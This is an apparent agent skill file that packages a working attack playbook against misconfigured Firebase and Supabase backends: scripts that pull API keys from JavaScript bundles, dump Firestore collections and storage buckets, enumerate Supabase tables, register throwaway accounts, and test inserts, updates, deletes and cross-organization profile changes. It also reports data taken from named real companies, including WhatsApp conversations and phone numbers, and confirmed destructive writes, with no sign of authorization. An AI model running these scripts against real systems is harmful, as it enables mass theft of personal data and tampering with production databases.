---
name: firebase-supabase-attack
description: Exploit Firebase/Supabase for data via JS config leak probe.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, firebase, supabase, firestore, cloud, data-breach]
    category: recon
    related_skills:
      - api-noauth-hunt
      - js-secrets-extraction
      - source-leak-hunt
---

# Firebase & Supabase Attack Skill

Exploit misconfigured Firebase (Firestore, Storage, Auth) and Supabase (REST API, Storage, Auth) backends. These BaaS platforms are the #1 source of massive data breaches in modern web apps when Row Level Security (RLS) is missing and API keys leak in JavaScript bundles. Confirmed on Brendi (204K WhatsApp conversations, 173K phone numbers), Visafy (64K users, 46K reports), Smart Fit (39K users, 5 Firebase projects, 21 credentials), agendadentista (9 clinics, 1,749 leads).

## When to Use

- JavaScript bundle analysis reveals Firebase config (`apiKey`, `projectId`) or Supabase URL + anon key.
- Target uses a modern SPA (React, Vue, Angular) with BaaS backend.
- After `js-secrets-extraction` finds Firebase/Supabase identifiers.
- After `source-leak-hunt` finds `.env` with `FIREBASE_*` or `SUPABASE_*` variables.

## Prerequisites

- `terminal` tool with curl, python3, jq.
- Firebase project ID or Supabase URL + anon key (from JS bundle, source leak, or recon).
- For Firebase SA key exploitation: `python3` with `google-auth` library.

## How to Run

```bash
# Firebase Firestore — list collections (if public)
curl -sk "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/"

# Supabase — list users table (if RLS missing)
curl -sk "https://PROJECT.supabase.co/rest/v1/users" \
  -H "apikey: ANON_KEY" -H "Authorization: Bearer ANON_KEY"

# Supabase — test signup (if open)
curl -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
  -H "apikey: ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"Test123!"}'
```

## Quick Reference

| Platform | What to Find | Exploit Path | Real Example |
|----------|-------------|-------------|--------------|
| Firebase Firestore | Public database rules | Direct REST API access, list all collections | Brendi: 204K conversations public |
| Firebase Storage | Public bucket rules | Download all files via REST API | Brendi: 1,000+ WhatsApp audio files public |
| Firebase Auth | Open signup | Create accounts, access protected resources | Smart Fit: Firebase Auth signup open |
| Firebase SA Key | Service account JSON | GCP IAM escalation, access all GCP resources | Smart Fit: 5 SA keys → full GCP access |
| Supabase REST | Missing RLS | SELECT/INSERT/UPDATE/DELETE on any table | Visafy: 64K users, 46K reports, DELETE confirmed |
| Supabase Storage | Public buckets | Download all files, upload malicious content | Visafy: public PDF reports bucket |
| Supabase Auth | Open signup | Create accounts, bypass access controls | agendadentista: open signup + auto-confirm |

## Procedure

### Phase 1 — Extract Configuration from JS Bundles

```bash
TARGET="$1"
OUTDIR="/root/output/firebase_supabase/$TARGET"
mkdir -p "$OUTDIR"

# Download homepage and common JS entry points
curl -sk "https://$TARGET/" -o "$OUTDIR/index.html"
curl -sk "https://$TARGET/app.js" -o "$OUTDIR/app.js" 2>/dev/null
curl -sk "https://$TARGET/main.js" -o "$OUTDIR/main.js" 2>/dev/null

echo "[*] Extracting Firebase/Supabase configs..."

# Firebase config pattern
grep -oP 'apiKey["\s:]+["][^"]+["]|projectId["\s:]+["][^"]+["]|firebase\.initializeApp' \
  "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u

# Supabase config pattern
grep -oP 'supabase\.co[^"'\'' ]+|supabaseUrl["\s:]+["][^"]+["]|supabaseKey["\s:]+["][^"]+["]|anon[_-]?key["\s:=]+["][^"]{20,}["]' \
  "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u
```

### Phase 2 — Firebase Firestore Exploitation

```bash
PROJECT_ID="$1"  # e.g., brendi-whatsapp-bot

echo "[*] Firestore enumeration for $PROJECT_ID"

# List root collections (if public)
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" | \
  python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if 'documents' in data:
        print(f'ERROR: {len(data[\"documents\"])} root docs — not a collection list')
    else:
        for k in data.keys():
            print(f'Collection: {k}')
except Exception as e:
    print(f'Error: {e}')
    print(sys.stdin.read()[:500])
" 2>/dev/null

# If Firestore requires auth, try with Firebase ID token from Auth
# (see Phase 4 for token generation via signup)
```

### Phase 3 — Firestore Collection & Document Access

```bash
PROJECT_ID="$1"
COLLECTION="$2"  # e.g., conversationsV3, users, stores

echo "[*] Accessing collection: $COLLECTION"

# List documents in collection
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'documents' in data:
    print(f'Documents found: {len(data[\"documents\"])}')
    for doc in data['documents'][:5]:
        name = doc['name'].split('/')[-1]
        fields = doc.get('fields', {})
        # Extract top-level fields
        keys = list(fields.keys())[:10]
        print(f'  {name}: {keys}')
    if len(data['documents']) > 5:
        print(f'  ... and {len(data[\"documents\"]) - 5} more')
elif 'error' in data:
    print(f'Error: {data[\"error\"][\"message\"]}')
" 2>/dev/null

# Read a specific document
DOC_ID="$3"  # from the listing above
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION/$DOC_ID" | \
  python3 -m json.tool 2>/dev/null | head -50
```

### Phase 4 — Firebase Auth Signup & Token Generation

```bash
API_KEY="$1"  # from JS bundle (web API key)
PROJECT_ID="$2"

echo "[*] Testing Firebase Auth signup on $PROJECT_ID"

# Sign up
SIGNUP_RESP=$(curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!","returnSecureToken":true}')

if echo "$SIGNUP_RESP" | grep -q "idToken"; then
  echo "[+] SIGNUP OPEN — account created!"
  ID_TOKEN=$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['idToken'])" 2>/dev/null)
  echo "  ID Token: ${ID_TOKEN:0:50}..."

  # Now use this token with Firestore
  echo "[*] Testing Firestore access with ID token..."
  curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" \
    -H "Authorization: Bearer $ID_TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'documents' in data:
    print(f'[+] ACCESS GRANTED — {len(data[\"documents\"])} collections visible')
elif 'error' in data:
    print(f'[-] Access denied: {data[\"error\"][\"message\"]}')
else:
    print(f'[?] Unknown response: {list(data.keys())}')
" 2>/dev/null
else
  echo "[-] Signup blocked: $(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('error',{}).get('message','unknown'))" 2>/dev/null)"
fi
```

### Phase 5 — Firebase Storage Enumeration

```bash
PROJECT_ID="$1"
BUCKET="${PROJECT_ID}.appspot.com"  # default bucket name

echo "[*] Storage enumeration for $BUCKET"

# List objects (if public)
curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'items' in data:
    total = len(data['items'])
    total_size = sum(int(i.get('size', 0)) for i in data['items'])
    print(f'Objects: {total} ({total_size:,} bytes)')
    for item in data['items'][:5]:
        print(f'  {item[\"name\"]} ({item.get(\"size\",0):,} bytes)')
elif 'error' in data:
    print(f'Error: {data[\"error\"][\"message\"]}')
"

# Download a specific file
OBJECT_NAME="$2"  # from listing
curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/$OBJECT_NAME?alt=media" \
  -o "/tmp/firebase_$OBJECT_NAME"
echo "[+] Downloaded to /tmp/firebase_$OBJECT_NAME"
```

### Phase 6 — Supabase REST API Exploitation

```bash
SUPABASE_URL="$1"  # e.g., https://gfgmuezavgzjmaxhflsu.supabase.co
ANON_KEY="$2"       # from JS bundle

echo "[*] Supabase REST API enumeration"

# Schema discovery — list tables by querying common names
TABLES=("users" "profiles" "organizations" "posts" "comments" "purchases"
        "orders" "products" "reports" "relatorios" "documents" "files"
        "messages" "conversations" "sessions" "audit_logs")

for table in "${TABLES[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    count=$(curl -sk "$SUPABASE_URL/rest/v1/$table?limit=0" \
      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
      -H "Prefer: count=exact" -I 2>/dev/null | grep -i "content-range" | grep -oP '\d+(?=/\d+$)')
    echo "  [TABLE] $table — HTTP 200 (${count:-?} rows)"

    # Fetch first 3 rows
    curl -sk "$SUPABASE_URL/rest/v1/$table?limit=3" \
      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | \
      python3 -m json.tool 2>/dev/null | head -20
    echo ""
  elif [[ "$code" == "401" || "$code" == "403" ]]; then
    echo "  [BLOCKED] $table — HTTP $code (RLS protected)"
  fi
done
```

### Phase 7 — Supabase CRUD Testing (RLS Bypass)

```bash
SUPABASE_URL="$1"
ANON_KEY="$2"
TABLE="$3"  # from table discovery above

echo "[*] CRUD testing on $TABLE"

# INSERT
echo -n "  INSERT: "
curl -sk -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"test":"rls_bypass_probe_'$(date +%s)'"}' \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""

# UPDATE (PATCH)
echo -n "  UPDATE: "
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"test":"rls_updated"}' \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""

# DELETE
echo -n "  DELETE: "
curl -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Prefer: return=minimal" \
  -o /dev/null -w "%{http_code}" 2>/dev/null
echo ""
```

### Phase 8 — Supabase Auth Signup

```bash
SUPABASE_URL="$1"
ANON_KEY="$2"

echo "[*] Supabase Auth signup test"

SIGNUP_RESP=$(curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!"}')

if echo "$SIGNUP_RESP" | grep -q "access_token"; then
  echo "[+] SIGNUP OPEN!"
  ACCESS_TOKEN=$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
  echo "  Access Token: ${ACCESS_TOKEN:0:50}..."

  # Test cross-org access (change organization_id in profile)
  curl -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])" 2>/dev/null)" \
    -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" -H "Prefer: return=representation" \
    -d '{"organization_id":1}' 2>/dev/null | python3 -m json.tool 2>/dev/null
  echo "  [*] If the above returned data for org_id=1, cross-organization access works"
else
  echo "[-] Signup blocked: $(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('msg','unknown'))" 2>/dev/null)"
fi
```

## Real Production Results

### Brendi (Firebase)
- **Firestore `conversationsV3`**: 204K WhatsApp conversations, 173K unique phone numbers, 497 stores — PUBLICLY READABLE
- **Firestore `stores`**: 4,000 stores with CNPJ, phone, GPS, menu — PATCH write confirmed
- **Firebase Auth**: signup open, anyone can create accounts
- **Storage**: 1,000+ MP3 audio files (WhatsApp voice messages) publicly accessible
- **Impact**: Full customer communication data, store management access

### Visafy (Supabase)
- **REST API**: Anon key grants full SELECT on users (64,105 records), relatorios (46,717), purchase (676)
- **CRUD**: DELETE confirmed on relatorio_completo, UPDATE confirmed on etapa
- **Auth**: signup open, email auto-confirmed
- **Storage**: relatorios and videos buckets public

### Smart Fit (Firebase — 5 projects, multi-cloud)
- 5 Firebase projects, 21 hardcoded credentials (MySQL, SendGrid, OVH S3, Algolia, ChatSkills, Redis, reCAPTCHA)
- Service Account keys → GCP IAM escalation (storage.admin, firebaseappcheck.admin, iam.serviceAccountTokenCreator)
- 16,179 files in Firebase Storage

## Pitfalls

- **Anon key is NOT a secret.** It's designed to be public. The vulnerability is missing RLS, not the key exposure itself.
- **Firestore rules may allow reads but not writes.** Test SELECT, INSERT, UPDATE, DELETE separately.
- **Supabase RLS may protect some tables but not others.** Test every table independently.
- **Firebase Auth signup may require email verification.** Check if the app auto-confirms emails (many do).
- **Rate limiting on Firestore REST API.** Spread requests 0.5-1s apart for large extractions.
- **API key in JS bundle may be truncated/redacted.** The key string visible in the minified bundle may show `AIzaSy...USd4` or similar truncation. This happens when the bundler splits the key across multiple string literals or when the key references a variable defined elsewhere. If the Firebase API tests return "API key not valid", the key may be a partial match from the regex. Extract the surrounding context (50+ chars on each side) to find the complete key.
- **Firebase project may not be deployed.** The Firebase project ID (e.g., `medxgo-2e637`) may exist in the GCP project registry but have no deployed Firebase resources (no Firestore, no Hosting, no Storage). Check `/firebaseapp.com`, `/firebaseio.com`, and `/firestore.googleapis.com` independently — each may return different results.

## Verification

- Firebase Firestore: MUST list collections/documents without authentication (no Authorization header).
- Supabase REST: MUST return HTTP 200 with data rows using only the anon key (no user JWT).
- Supabase CRUD: MUST confirm at least one write operation (INSERT/UPDATE/DELETE) succeeds.
- Firebase Auth signup: MUST return `idToken` or `access_token` in the response.
- Firebase Storage: MUST list objects without authentication.
- Document all accessible data: collection/table names, row counts, sensitive fields exposed.
